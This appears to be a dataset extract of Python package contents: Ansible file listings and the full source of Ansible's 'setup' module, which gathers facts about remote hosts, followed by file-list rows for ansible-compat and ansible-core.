__init__.py .gitignore ansible-config.1 ansible-console.1 ansible-doc.1 ansible-galaxy.1 ansible-inventory.1 ansible-playbook.1 ansible-pull.1 ansible-vault.1 ansible.1 .gitdir cli_rst.j2 collections_galaxy_meta.rst.j2 config.rst.j2 man.j2 modules_by_category.rst.j2 playbooks_keywords.rst.j2 ansible.cfg hosts ConfigureRemotingForAnsible.ps1 upgrade_to_ps3.ps1 build-ansible.py announce.py change_detection.py commands.py collection_meta.py docs_build.py dump_config.py dump_keywords.py file_deprecated_issues.py generate_man.py porting_guide.py release_announcement.py update_intersphinx.py errors.py __init__.py __init__.py adhoc.py option_helpers.py __init__.py config.py console.py doc.py galaxy.py inventory.py playbook.py pull.py ansible_cli_stub.py ansible_connection_cli_stub.py __init__.py vault.py __init__.py list.py __init__.py __init__.py __init__.py ansible_builtin_runtime.yml base.yml data.py manager.py __init__.py constants.py context.py yaml_strings.py __init__.py action_write_locks.py python_target.py __init__.py interpreter_discovery.py module_common.py playbook_executor.py play_iterator.py async_watchdog.ps1 async_wrapper.ps1 become_wrapper.ps1 bootstrap_wrapper.ps1 coverage_wrapper.ps1 exec_wrapper.ps1 module_manifest.py module_powershell_wrapper.ps1 module_script_wrapper.ps1 module_wrapper.ps1 __init__.py worker.py __init__.py stats.py task_executor.py task_queue_manager.py task_result.py __init__.py api.py collection.py .travis.yml apb.yml.j2 main.yml.j2 Dockerfile.j2 .git_keep main.yml.j2 Makefile.j2 main.yml.j2 deprovision.yml.j2 provision.yml.j2 README.md main.yml.j2 .git_keep ansible.cfg inventory test.yml.j2 main.yml.j2 collections_galaxy_meta.yml .travis.yml main.yml.j2 .git_keep main.yml.j2 container.yml.j2 main.yml.j2 README.md main.yml.j2 .git_keep ansible.cfg inventory test.yml.j2 main.yml.j2 .git_keep galaxy.yml.j2 README.md.j2 README.md.j2 .git_keep .travis.yml main.yml.j2 .git_keep main.yml.j2 main.yml.j2 README.md main.yml.j2 .git_keep inventory test.yml.j2 main.yml.j2 .travis.yml example.py.j2 main.yml.j2 .git_keep example_command.py.j2 example_config.py.j2 example_facts.py.j2 main.yml.j2 example.py.j2 example.py.j2 README.md main.yml.j2 .git_keep example.py.j2 inventory test.yml.j2 main.yml.j2 role.py token.py user_agent.py __init__.py data.py group.py helpers.py host.py manager.py __init__.py add_host.py apt.py apt_key.py apt_repository.py assemble.py assert.py async_status.py async_wrapper.py blockinfile.py command.py copy.py cron.py debconf.py debug.py dnf.py dpkg_selections.py expect.py fail.py fetch.py file.py find.py gather_facts.py getent.py get_url.py git.py group.py group_by.py hostname.py import_playbook.py import_role.py import_tasks.py include.py include_role.py include_tasks.py include_vars.py iptables.py known_hosts.py lineinfile.py meta.py package.py package_facts.py pause.py ping.py pip.py raw.py reboot.py replace.py rpm_key.py script.py service.py service_facts.py setup.py set_fact.py set_stats.py shell.py slurp.py stat.py subversion.py systemd.py sysvinit.py tempfile.py template.py unarchive.py uri.py user.py wait_for.py wait_for_connection.py yum.py yum_repository.py __init__.py ansible_release.py api.py basic.py collections.py dict_transformations.py file.py json.py network.py parameters.py process.py removed.py sys_info.py converters.py formatters.py __init__.py validation.py warnings.py _collections_compat.py _json_compat.py _utils.py __init__.py importlib.py paramiko.py selectors.py _selectors2.py __init__.py connection.py Ansible.AccessToken.cs Ansible.Basic.cs Ansible.Become.cs Ansible.Privilege.cs Ansible.Process.cs __init__.py _distro.py __init__.py ansible_collector.py collector.py compat.py default_collectors.py aix.py base.py darwin.py dragonfly.py freebsd.py hpux.py hurd.py linux.py netbsd.py openbsd.py sunos.py __init__.py namespace.py aix.py base.py darwin.py dragonfly.py fc_wwn.py freebsd.py generic_bsd.py hpux.py hurd.py iscsi.py linux.py netbsd.py nvme.py openbsd.py sunos.py __init__.py facter.py ohai.py __init__.py packages.py sysctl.py apparmor.py caps.py chroot.py cmdline.py date_time.py distribution.py dns.py env.py fips.py local.py lsb.py pkg_mgr.py platform.py python.py selinux.py service_mgr.py ssh_pub_keys.py user.py __init__.py timeout.py utils.py base.py dragonfly.py freebsd.py hpux.py linux.py netbsd.py openbsd.py sunos.py sysctl.py __init__.py __init__.py json_utils.py convert_bool.py __init__.py Ansible.ModuleUtils.AddType.psm1 Ansible.ModuleUtils.ArgvParser.psm1 Ansible.ModuleUtils.Backup.psm1 Ansible.ModuleUtils.CamelConversion.psm1 Ansible.ModuleUtils.CommandUtil.psm1 Ansible.ModuleUtils.FileUtil.psm1 Ansible.ModuleUtils.Legacy.psm1 Ansible.ModuleUtils.LinkUtil.psm1 Ansible.ModuleUtils.PrivilegeUtil.psm1 Ansible.ModuleUtils.SID.psm1 Ansible.ModuleUtils.WebRequest.psm1 __init__.py pycompat24.py service.py __init__.py splitter.py urls.py yumdnf.py _text.py __init__.py ajson.py dataloader.py mod_args.py plugin_docs.py quoting.py splitter.py addresses.py jsonify.py yaml.py __init__.py __init__.py constructor.py dumper.py loader.py objects.py __init__.py __init__.py attribute.py base.py block.py collectionsearch.py conditional.py handler.py handler_task_include.py helpers.py included_file.py loop_control.py play.py playbook_include.py play_context.py definition.py include.py metadata.py requirement.py __init__.py role_include.py taggable.py task.py task_include.py __init__.py add_host.py assemble.py assert.py async_status.py command.py copy.py debug.py fail.py fetch.py gather_facts.py group_by.py include_vars.py normal.py package.py pause.py raw.py reboot.py script.py service.py set_fact.py set_stats.py shell.py template.py unarchive.py uri.py wait_for_connection.py yum.py __init__.py runas.py su.py sudo.py __init__.py base.py jsonfile.py memory.py __init__.py default.py junit.py minimal.py oneline.py tree.py __init__.py __init__.py local.py paramiko_ssh.py psrp.py ssh.py winrm.py __init__.py action_common_attributes.py backup.py connection_pipelining.py constructed.py decrypt.py default_callback.py files.py inventory_cache.py return_common.py shell_common.py shell_windows.py template_common.py url.py url_windows.py validate.py vars_plugin_staging.py __init__.py core.py mathstuff.py urls.py urlsplit.py __init__.py __init__.py advanced_host_list.py auto.py constructed.py generator.py host_list.py ini.py script.py toml.py yaml.py __init__.py loader.py config.py csvfile.py dict.py env.py file.py fileglob.py first_found.py indexed_items.py ini.py inventory_hostnames.py items.py lines.py list.py nested.py password.py pipe.py random_choice.py sequence.py subelements.py template.py together.py unvault.py url.py varnames.py vars.py __init__.py __init__.py cmd.py powershell.py sh.py __init__.py debug.py free.py host_pinned.py linear.py __init__.py __init__.py core.py files.py mathstuff.py __init__.py host_group_vars.py __init__.py __init__.py release.py native_helpers.py safe_eval.py template.py vars.py __init__.py cmd_functions.py _collection_config.py _collection_finder.py _collection_meta.py __init__.py color.py context_objects.py display.py encrypt.py fqcn.py galaxy.py hashing.py helpers.py jsonrpc.py listify.py multiprocessing.py path.py plugin_docs.py py3compat.py sentinel.py shlex.py singleton.py ssh_functions.py unicode.py unsafe_proxy.py vars.py version.py __init__.py clean.py fact_cache.py hostvars.py manager.py plugins.py reserved.py __init__.py __init__.py __init__.py Apache-License.txt MIT-license.txt PSF-license.txt simplified_bsd.txt Makefile MANIFEST.in README.md ansible-base.dirs ansible-base.install ansible-test.install changelog compat control copyright Dockerfile docs pycompat README.md rules README.md .gitignore README.md Portfile Makefile version_helper_test.py __init__.py version_helper.py __init__.py check-link-behavior.py PKG-INFO README.rst requirements.txt setup.py SYMLINK_CACHE.json Makefile test_diff.py test_validate_modules_regex.py network-integration.cfg network-integration.requirements.txt aliases main.yml aliases check_rlimit_and_maxfd.py custom_module.py sys_check.py custom_util.py main.yml adhoc-callback.stdout aliases ansible-test_.cfg callback_debug.py no-extension playbook.yml playbookdir_cfg.ini runme.sh vars.yml aliases fakemodule.output inventory test_docs.py test_docs_missing_description.py test_docs_non_iterable_status.py test_docs_no_metadata.py test_docs_no_status.py test_docs_removed_precedence.py test_docs_removed_status.py test_docs_returns.py test_docs_returns_broken.py test_docs_suboptions.py test_empty.py test_no_docs.py test_no_docs_non_iterable_status.p test_no_docs_no_metadata.py test_no_docs_no_status.py runme.sh test.yml test_docs_returns.output test_docs_suboptions.output aliases cleanup-default.yml cleanup-freebsd.yml cleanup.yml runme.sh setup.yml aliases build_bad_tar.py setup_collections.py main.yml build.yml download.yml init.yml install.yml main.yml publish.yml ansible.cfg.j2 main.yml aliases main.yml download.yml empty_installed_co individual_collect main.yml multi_collection_r reinstalling.yml scm_dependency.yml scm_dependency_ded setup.yml setup_multi_collec setup_recursive_sc aliases adhoc_example1.py constraints.txt playbook_example1.py parse.py inventory runme.sh adhoc_example1.yml main.yml playbook_example1.yml setup.yml test.yml aliases galaxy.yml runtime.y README.rst i constraints.sh coverage.sh git-at-collection-base.s git-at-collection-root.s git-common.bash install-git.yml venv.sh runme.sh aliases galaxy. docker.sh runme.sh 18602.yml aliases always_block.yml inventory on_includes.yml play_level.yml runme.sh test_fatal.yml aliases main.yml main.yml apt-builddep.yml apt-multiarch.yml apt.yml main.yml repo.yml upgrade.yml url-with-deps.yml default.yml Ubuntu-20.yml aliases main.yml apt_key.yml main.yml aliases main.yml apt.yml cleanup.yml main.yml mode.yaml mode_cleanup.yaml aliases runme.sh aliases argspec.py main.yml password_no_log.yml aliases fragment1 fragment2 fragment3 fragment4 fragment5 main.yml main.yml aliases assert_quiet.out.quiet.stderr assert_quiet.out.quiet.stdout inventory quiet.yml runme.sh aliases async_test.py main.yml main.yml aliases junkping.py runme.sh test_async.yml normal.py aliases async_test.py main.yml main.yml aliases baz.txt default.yml main.yml su.yml sudo.yml bar.j2 default.yml aliases runme.sh aliases b64_latin1 b64_utf8 from_playbook main.yml main.yml b64_latin1_template.j2 b64_utf8_template.j2 from_playbook_template.j2 main.yml aliases download_binary_modules.yml all .gitignore helloworld.go Makefile main.ym test.sh test_binary_modules.yml aliases runme.sh aliases runme.sh aliases sshd_config main.yml add_block_to_existing_file.yml block_without_trailing_newline.yml create_file.yml diff.yml file_without_trailing_newline.yml insertafter.yml insertbefore.yml main.yml preserve_line_endings.yml validate.yml aliases always_failure_no_rescue_rc.yml always_failure_with_rescue_rc.yml always_no_rescue_rc.yml block_fail.yml block_fail_tasks.yml block_in_rescue.yml block_rescue_vars.yml fail.yml finalized_task.yml issue29047.yml issue29047_tasks.yml issue71306.yml main.yml nested_fail.yml nested_nested_fail.yml main.yml runme.sh unsafe_failed_task.yml aliases runme.sh test-vars_prompt.py unsafe.yml unsupported.yml vars_prompt-1.yml vars_prompt-2.yml vars_prompt-3.yml vars_prompt-4.yml vars_prompt-5.yml vars_prompt-6.yml vars_prompt-7.yml aliases callback_default.out.check_markers_dr callback_default.out.check_markers_we callback_default.out.check_nomarkers_ callback_default.out.default.stderr callback_default.out.default.stdout callback_default.out.failed_to_stderr callback_default.out.free.stdout callback_default.out.hide_ok.stderr callback_default.out.hide_ok.stdout callback_default.out.hide_skipped.std callback_default.out.hide_skipped_ok. callback_default.out.host_pinned.stdo include_me.yml inventory runme.sh test.yml test_2.yml test_dryrun.yml test_non_lockstep.yml aliases main.yml main.yml aliases check_mode-not-on-cli.yml check_mode-on-cli.yml check_mode.yml main.yml main.yml foo.txt main.yml foo.j2 main.yml runme.sh aliases runme.sh setup.yml test-cli.py test_k_and_K.py a.statichost.yml aliases cache.statichost.yml check_populated_inventory.yml con v1_vars_plugin.py v2_vars_plugin.py vars_req_whitelist.py override_formerly_core_mask includeme.yml inventory_test.yml invocation_tests.yml ping.py noop.yml posix.yml redirected.statichost.yml main.yml main.yml runme.sh MANIFEST.json testmodule2.py test_bypass_host_loop.yml test_collection_meta.yml override_formerly_core_masked test_redirect_list.yml vars_plugin_tests.sh windows.yml aliases runme.sh test.yml aliases runme.sh test.yml windows.yml aliases runme.sh aliases create_afile.sh remove_afile.sh test.sh main.yml main.yml aliases main.yml is_mac.py aliases play.yml runme.sh test_no_warnings.yml test_warnings.yml main.yml aliases inline_comment_ansible.cfg runme.sh aliases test.sh test_connection.yml test_reset_connection.yml delegation_action aliases delegation_co inventory.ini runme.sh test.yml aliases runme.sh test_connection.inventory aliases runme.sh test.sh test_connection.inventory aliases test.sh aliases empty.txt runme.sh tests.yml test_connection.inventory.j2 aliases posix.sh runme.sh test_connection.inventory aliases runme.sh tests.yml tests_fetch.yml test_connection.inventory.j2 windows.sh aliases runme.sh test_connection.inventory.j2 aliases main.yml foo.txt bar.txt bar.txt baz.txt qux.txt main.yml acls.yml check_mode.yml dest_in_non_existent_directories.yml dest_in_non_existent_directories_remote_src main.yml no_log.yml selinux.yml src_file_dest_file_in_non_existent_dir.yml src_file_dest_file_in_non_existent_dir_remo tests.yml aliases main.yml main.yml main.yml alpine.yml default.yml aliases attempt_to_load_invalid_json.yml runme.sh invalid.json aliases main.yml main.yml aliases main.yml main_fqcn.yml nosetfacts.yml runme.sh aliases fakelocal.py delegate_and_nolog.yml delegate_facts_block.yml delegate_local_from_root.yml delegate_vars_hanldling.yml discovery_applied.yml testfile has_hostvars.yml inventory inventory_interpreters detect_interpreter.py foo.j2 runme.sh test_delegate_to.yml test_delegate_to_loop_caching.yml test_delegate_to_loop_randomness.yml test_loop_control.yml verify_interpreter.yml aliases convert_camelCase.py convert_snake_case.py main.yml test_convert_camelCase.yml test_convert_snake_case.yml aliases main.yml dnf.yml dnfinstallroot.yml dnfreleasever.yml filters.yml filters_check_mode.yml gpg.yml logging.yml main.yml modularity.yml repo.yml CentOS.yml Fedora.yml main.yml RedHat.yml aliases main.yaml dpkg_selections.yaml main.yaml aliases import_pkg_resources.py main.yml aliases test_integration_module main.yml aliases runme.sh test_environment.yml aliases dummy.py inventory play.yml runme.sh aliases foo.txt test_command.py main.yml aliases basdscript.fact goodscript.fact preferences.fact unreadable.fact main.yml main.yml aliases main.yml main.yml aliases main.yml aliases avoid_slurp_return.yml here.txt slurp.py main.yml main.yml runme.sh run_fetch_tests.yml aliases main.yml foo.txt fileC fileD fileA fileB main.yml diff_peek.yml directory_as_dest.yml initialize.yml main.yml selinux_tests.yml state_link.yml unicode_path.yml aliases 9851.txt one.txt two.txt foo.txt handle_undefined_type_errors.yml localhost main.yml runme.sh runme.yml main.yml foo.j2 py26json.j2 main.yml aliases main.yml aliases runme.sh runme.yml main.yml aliases main.yml aliases main.yml main.yml aliases explicit.yml implicit.yml runme.sh smart.yml uuid.fact aliases none.py inventory bogus_facts facts_one facts_two file_utils.py one_two.json prevent_clobbering.yml runme.sh test_gathering_facts.yml test_module_defaults.yml test_prevent_injection.yml test_run_once.yml two_one.json uuid.fact verify_merge_facts.yml verify_subset.yml aliases main.yml main.yml aliases testserver.py main.yml main.yml aliases cleanup-default.yml cleanup-freebsd.yml main.yml main.yml ambiguous-ref.yml archive.yml change-repo-url.yml checkout-new-tag.yml depth.yml forcefully-fetch-tag.yml formats.yml gpg-verification.yml localmods.yml main.yml missing_hostkey.yml no-destination.yml reset-origin.yml separate-git-dir.yml setup-local-repos.yml setup.yml specific-revision.yml submodules.yml main.yml aliases gidget.py grouplist.sh main.yml main.yml tests.yml aliases requirements.txt runme.sh test_jinja2_groupby.yml aliases create_groups.yml all camelus vicugna inventory.group_by runme.sh test_group_by.yml test_group_by_skipped.yml aliases from_handlers.yml handlers.yml inventory.handlers main.yml main.yml main.yml main.yml main.yml main.yml main.yml mai main.ym main.y main.yml main.yml alternate.y main.yml main.yml ma main. runme.sh test_force_handlers.yml test_handlers.yml test_handlers_any_errors_fatal.yml test_handlers_include.yml test_handlers_include_role.yml test_handlers_including_task.yml test_handlers_inexistent_notify.yml test_handlers_listen.yml test_handlers_template_run_once.yml test_listening_handlers.yml test_templating_in_handlers.yml aliases inventory main.yml main.yml main.yml main.yml runme.sh test_handler_race.yml aliases all testhost main.yml main.yml main.yml main.yml runme.sh test_hash.yml test_inv1.yml test_inv2.yml test_inventory_hash.yml test_hash_vars.yml aliases inventory.hosts_field runme.sh test_hosts_field.json test_hosts_field.yml aliases main.yml main.yml aliases bad_exec.py bad_put_file.py inventory main.yml runme.sh test_base_cannot_connect.yml test_cannot_connect.yml test_with_bad_plugins.yml aliases main.yml cf_template.json main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml check_mode.yml main.yml setup.yml test.yml aliases create_inventor empty_inventory populate_cache. setup.yml tear_down.yml test_invalid_aw test_inventory_ test_populating test_refresh_in runme.sh inventory.yml inventory_with_ test.aws_ec2.yml aliases inventory_1.docker_s inventory_2.docker_s main.yml swarm_clea swarm_setu test_inven runme.sh aliases ansible.cfg inspect_cache.yml runme.sh test_foreman_inventory.ym aliases main.yaml ios1.cfg nonascii.bin cli.yaml main.yaml net_get.yaml net_put.yaml aliases main.yml main.yml setup.yml teardown.yml test_grow_reduce.yml test_indempotency.yml aliases main.yml main.yml main.yml mongod_singlenode.y mongod_teardown.yml aliases main.yml main.yml main.yml postgresql_user_gener postgresql_user_initi test_no_password_chan test_password.yml aliases main.yml main.yml main.yml Debian.yml Fedora.yml main.yml RedHat-7.yml RedHat-8.yml Suse.yml Debian.yml default.yml Fedora.yml RedHat-7.yml RedHat-8.yml Suse.yml Ubuntu-14.yml aliases main.yml common.yml main.yml aliases repo.tar.xz main.yaml main.yaml README.md main.yaml aliases main.yml main.yml main.yml aliases main.yml dummy--1.0.sql dummy--2.0.sql dummy--3.0.sql dummy.control pg_hba.conf main.yml ssl.yml Debian-8.yml default-py3.yml default.yml FreeBSD-11-py3.yml FreeBSD-11.yml FreeBSD-12.0-py3.y FreeBSD-12.0.yml FreeBSD-12.1-py3.y FreeBSD-12.1.yml RedHat-py3.yml RedHat.yml Ubuntu-12.yml Ubuntu-14.yml Ubuntu-16-py3.yml Ubuntu-16.yml Ubuntu-18-py3.yml Ubuntu-20-py3.yml aliases ca_certificate.pem ca_key.pem client_certificate.pem client_key.pem server_certificate.pem server_key.pem main.yml aliases bar.txt foo.txt main.yml aliases main.yml test.yml aliases main.yaml cli.yaml cli_config.yaml main.yaml backup.yaml check_config.yaml comment.yaml config.cfg save.yaml simple.yaml cli_backup.yam cli_basic.yaml cli_comment.ya aliases main.yaml main.yaml cli.yaml main.yaml deleted.yaml empty_config merged.yaml overridden.y replaced.yam rtt.yaml _populate.ya _populate_in _remove_conf main.yaml aliases main.yaml aliases main.yml empty.txt foo.txt bar.txt baz.txt neste readme.txt vault-file main.yml remote_tests.yml tests.yml aliases main.yml main.yml pre_test.yml tests.yml partition_ aliases xTestDsc.psd1 xTestDsc.psd1 main.yml main.yml tests.yml aliases test.txt testempty.txt testnoeof.txt test_linebreak.txt test_quoting.txt main.yml main.yml aliases win_ping_set_attr.ps1 win_ping_strict_mode_error win_ping_syntax_error.ps1 win_ping_throw.ps1 win_ping_throw_string.ps1 main.yml aliases main.yml main.yml aliases main.yml main.yml aliases main.yml post_reboot.ps1 aliases test_win_securi main.yml tests.yml aliases ansible-xml-beers-unicode.xml ansible-xml-beers.xml ansible-xml-namespaced-beers.x test-add-children-elements-unic test-add-children-elements.xml test-add-children-from-groupvar test-add-children-insertafter.x test-add-children-insertbefore. test-add-children-with-attribut test-add-element-implicitly.yml test-add-namespaced-children-el test-pretty-print-only.xml test-pretty-print.xml test-remove-attribute.xml test-remove-element.xml test-remove-namespaced-attribut test-remove-namespaced-element. test-set-attribute-value-unicod test-set-attribute-value.xml test-set-children-elements-leve test-set-children-elements-unic test-set-children-elements.xml test-set-element-value-empty.xm test-set-element-value-unicode. test-set-element-value.xml test-set-namespaced-attribute-v test-set-namespaced-element-val main.yml test-add-children-elements-unicod test-add-children-elements.yml test-add-children-from-groupvars. test-add-children-insertafter.yml test-add-children-insertbefore.ym test-add-children-with-attributes test-add-element-implicitly.yml test-add-namespaced-children-elem test-children-elements-xml.yml test-count-unicode.yml test-count.yml test-get-element-content-unicode. test-get-element-content.yml test-mutually-exclusive-attribute test-pretty-print-only.yml test-pretty-print.yml test-remove-attribute.yml test-remove-element.yml test-remove-namespaced-attribute. test-remove-namespaced-element.ym test-set-attribute-value-unicode. test-set-attribute-value.yml test-set-children-elements-level. test-set-children-elements-unicod test-set-children-elements.yml test-set-element-value-empty.yml test-set-element-value-unicode.ym test-set-element-value.yml test-set-namespaced-attribute-val test-set-namespaced-children-elem test-set-namespaced-element-value test-xmlstring.yml main.yml aliases import_apply.yml include_apply.yml include_tasks.yml main.yml main.ym playbook.yml tasks.yml block_include_tasks.yml import.yml import_include_include_tasks include_level_1.yml playbook.yml inventory nested.yml playbook.yml loca main othe all.yml playbook1.yml playbook2.yml playbook3.yml playbook4.yml playbook_needing_vars.yml helloworl sub_playbook.yml test_import_playbook.yml test_import_playbook_tags.yml validate1.yml validate2.yml validate34.yml validate_tags.yml no_bleeding.yml no_overwrite_roles.yml playbook.yml,"#!/usr/bin/python
# -*- coding: utf-8 -*-

# (c) 2012, Michael DeHaan <michael.dehaan@gmail.com>
# GNU General Public License v3.0+ (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)

from __future__ import absolute_import, division, print_function
__metaclass__ = type


DOCUMENTATION = '''
---
module: setup
version_added: historical
short_description: Gathers facts about remote hosts
options:
    gather_subset:
        version_added: ""2.1""
        description:
            - ""If supplied, restrict the additional facts collected to the given subset.
              Possible values: C(all), C(min), C(hardware), C(network), C(virtual), C(ohai), and
              C(facter). Can specify a list of values to specify a larger subset.
              Values can also be used with an initial C(!) to specify that
              that specific subset should not be collected.  For instance:
              C(!hardware,!network,!virtual,!ohai,!facter). If C(!all) is specified
              then only the min subset is collected. To avoid collecting even the
              min subset, specify C(!all,!min). To collect only specific facts,
              use C(!all,!min), and specify the particular fact subsets.
              Use the filter parameter if you do not want to display some collected
              facts.""
        default: ""all""
    gather_timeout:
        version_added: ""2.2""
        description:
            - Set the default timeout in seconds for individual fact gathering.
        default: 10
    filter:
        version_added: ""1.1""
        description:
            - If supplied, only return facts that match this shell-style (fnmatch) wildcard.
        default: ""*""
    fact_path:
        version_added: ""1.3""
        description:
            - Path used for local ansible facts (C(*.fact)) - files in this dir
              will be run (if executable) and their results be added to C(ansible_local) facts.
              If a file is not executable it is read instead.
              File/results format can be JSON or INI-format. The default C(fact_path) can be
              specified in C(ansible.cfg) for when setup is automatically called as part of
              C(gather_facts).
              NOTE - For windows clients, the results will be added to a variable named after the
              local file (without extension suffix), rather than C(ansible_local).
            - Since Ansible 2.1, Windows hosts can use C(fact_path). Make sure that this path
              exists on the target host. Files in this path MUST be PowerShell scripts C(.ps1)
              which outputs an object. This object will be formatted by Ansible as json so the
              script should be outputting a raw hashtable, array, or other primitive object.
        default: /etc/ansible/facts.d
description:
    - This module is automatically called by playbooks to gather useful
      variables about remote hosts that can be used in playbooks. It can also be
      executed directly by C(/usr/bin/ansible) to check what variables are
      available to a host. Ansible provides many I(facts) about the system,
      automatically.
    - This module is also supported for Windows targets.
notes:
    - More ansible facts will be added with successive releases. If I(facter) or
      I(ohai) are installed, variables from these programs will also be snapshotted
      into the JSON file for usage in templating. These variables are prefixed
      with C(facter_) and C(ohai_) so it's easy to tell their source. All variables are
      bubbled up to the caller. Using the ansible facts and choosing to not
      install I(facter) and I(ohai) means you can avoid Ruby-dependencies on your
      remote systems. (See also M(community.general.facter) and M(community.general.ohai).)
    - The filter option filters only the first level subkey below ansible_facts.
    - If the target host is Windows, you will not currently have the ability to use
      C(filter) as this is provided by a simpler implementation of the module.
    - This module is also supported for Windows targets.
    - This module should be run with elevated privileges on BSD systems to gather facts like ansible_product_version.
    - Supports C(check_mode).
author:
    - ""Ansible Core Team""
    - ""Michael DeHaan""
'''

EXAMPLES = """"""
# Display facts from all hosts and store them indexed by I(hostname) at C(/tmp/facts).
# ansible all -m ansible.builtin.setup --tree /tmp/facts

# Display only facts regarding memory found by ansible on all hosts and output them.
# ansible all -m ansible.builtin.setup -a 'filter=ansible_*_mb'

# Display only facts returned by facter.
# ansible all -m ansible.builtin.setup -a 'filter=facter_*'

# Collect only facts returned by facter.
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all,!any,facter'

- name: Collect only facts returned by facter
  ansible.builtin.setup:
    gather_subset:
      - '!all'
      - '!any'
      - facter

# Display only facts about certain interfaces.
# ansible all -m ansible.builtin.setup -a 'filter=ansible_eth[0-2]'

# Restrict additional gathered facts to network and virtual (includes default minimum facts)
# ansible all -m ansible.builtin.setup -a 'gather_subset=network,virtual'

# Collect only network and virtual (excludes default minimum facts)
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all,!any,network,virtual'

# Do not call puppet facter or ohai even if present.
# ansible all -m ansible.builtin.setup -a 'gather_subset=!facter,!ohai'

# Only collect the default minimum amount of facts:
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all'

# Collect no facts, even the default minimum subset of facts:
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all,!min'

# Display facts from Windows hosts with custom facts stored in C(C:\\custom_facts).
# ansible windows -m ansible.builtin.setup -a ""fact_path='c:\\custom_facts'""
""""""

# import module snippets
from ..module_utils.basic import AnsibleModule

from ansible.module_utils._text import to_text
from ansible.module_utils.facts import ansible_collector, default_collectors
from ansible.module_utils.facts.collector import CollectorNotFoundError, CycleFoundInFactDeps, UnresolvedFactDep
from ansible.module_utils.facts.namespace import PrefixFactNamespace


def main():
    module = AnsibleModule(
        argument_spec=dict(
            gather_subset=dict(default=[""all""], required=False, type='list'),
            gather_timeout=dict(default=10, required=False, type='int'),
            filter=dict(default=""*"", required=False),
            fact_path=dict(default='/etc/ansible/facts.d', required=False, type='path'),
        ),
        supports_check_mode=True,
    )

    gather_subset = module.params['gather_subset']
    gather_timeout = module.params['gather_timeout']
    filter_spec = module.params['filter']

    # TODO: this mimics existing behavior where gather_subset=[""!all""] actually means
    #       to collect nothing except for the below list
    # TODO: decide what '!all' means, I lean towards making it mean none, but likely needs
    #       some tweaking on how gather_subset operations are performed
    minimal_gather_subset = frozenset(['apparmor', 'caps', 'cmdline', 'date_time',
                                       'distribution', 'dns', 'env', 'fips', 'local',
                                       'lsb', 'pkg_mgr', 'platform', 'python', 'selinux',
                                       'service_mgr', 'ssh_pub_keys', 'user'])

    all_collector_classes = default_collectors.collectors

    # rename namespace_name to root_key?
    namespace = PrefixFactNamespace(namespace_name='ansible',
                                    prefix='ansible_')

    try:
        fact_collector = ansible_collector.get_ansible_collector(all_collector_classes=all_collector_classes,
                                                                 namespace=namespace,
                                                                 filter_spec=filter_spec,
                                                                 gather_subset=gather_subset,
                                                                 gather_timeout=gather_timeout,
                                                                 minimal_gather_subset=minimal_gather_subset)
    except (TypeError, CollectorNotFoundError, CycleFoundInFactDeps, UnresolvedFactDep) as e:
        # bad subset given, collector, idk, deps declared but not found
        module.fail_json(msg=to_text(e))

    facts_dict = fact_collector.collect(module=module)

    module.exit_json(ansible_facts=facts_dict)


if __name__ == '__main__':
    main()
",1
ansible-compat-2.2.0,0,1,1,1,0,0,0,0,.flake8 CODEOWNERS CODE_OF_CONDUCT.md release-drafter.yml ack.yml push.yml release.yml tox.yml .gitignore .pre-commit-config.yaml .pylintrc .readthedocs.yml .yamllint codecov.yml conf.py examples.md index.md requirements.yml requirements.yml LICENSE mypy.ini PKG-INFO pyproject.toml README.md requirements.txt setup.cfg config.py constants.py errors.py loaders.py ports.py prerun.py py.typed runtime.py schema.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt requirements-invalid-collection.yml requirements-invalid-role.yml validate0_data.json validate0_expected.json validate0_schema.json galaxy.yml galaxy.yml converge.yml molecule.yml converge.yml molecule.yml main.yml conftest.py main.yml requirements.yml main.yml main.yml main.yml main.yml test_api.py test_config.py test_configuration_example.py test_prerun.py test_runtime.py test_runtime_example.py test_schema.py __init__.py tox.ini,,1
ansible-core-2.13.2,1,1,1,1,0,0,0,0,ansible ansible-config ansible-connection ansible-console ansible-doc ansible-galaxy ansible-inventory ansible-playbook ansible-pull ansible-test ansible-vault CHANGELOG-v2.13.rst CHANGELOG.rst changelog.yaml COPYING find-plugin-refs.py testing_formatter.sh .gitignore .nojekyll banner.html breadcrumbs.html version_chooser.html ansible_2_10.inv ansible_2_5.inv ansible_2_6.inv ansible_2_7.inv ansible_2_8.inv ansible_2_9.inv ansible_3.inv ansible_4.inv ansible_5.inv ansible_6.inv collection-plugins.yml jinja2.inv Makefile Makefile.sphinx modules.js python2.inv python3.inv README.md requirements.txt 2.10_index.rst 404.rst ansible_index.rst index.rst all_plugins.rst advanced_index.rst code_of_conduct.rst collection_integration_about. collection_integration_about.rst collection_integration_add.rs collection_integration_add.rst collection_integration_runnin collection_integration_running.rst collection_integration_tests. collection_integration_tests.rst collection_integration_updati collection_integration_updating.rst collection_release_without_br collection_release_without_branches.rst collection_release_with_branc collection_release_with_branches.rst collection_releasing.rst collection_reviewing.rst collection_test_pr_locally.rs collection_test_pr_locally.rst collection_unit_tests.rst test_index.rst collection_development_process.rst committer_guidelines.rst communication.rst contributing_maintained_collections.rst contributions.rst contributions_collections.rst contributor_license_agreement.rst contributor_path.rst create_pr_quick_start.rst development_process.rst documentation_contributions.rst getting_started.rst github_admins.rst how_can_I_help.rst index.rst maintainers.rst maintainers_guidelines.rst maintainers_workflow.rst other_tools_and_programs.rst release_managers.rst reporting_bugs_and_features.rst reporting_collections.rst community_steering_committee.rst steering_committee_membership.rst steering_committee_past_members.rst steering_index.rst core_index.rst ansible_index.rst core_branches_and_tags.rst core_index.rst debugging.rst developing_api.rst developing_collections.rst developing_collections_changelogs.rst developing_collections_contributing.rst developing_collections_creating.rst developing_collections_distributing.rst developing_collections_migrating.rst developing_collections_shared.rst developing_collections_structure.rst developing_collections_testing.rst developing_core.rst developing_inventory.rst developing_locally.rst developing_modules.rst developing_modules_best_practices.rst developing_modules_checklist.rst developing_modules_documenting.rst developing_modules_general.rst developing_modules_general_aci.rst developing_modules_general_windows.rst developing_modules_in_groups.rst developing_module_utilities.rst developing_plugins.rst developing_program_flow_modules.rst developing_python_3.rst developing_rebasing.rst migrating_roles.rst module_lifecycle.rst overview_architecture.rst aws_guidelines.rst 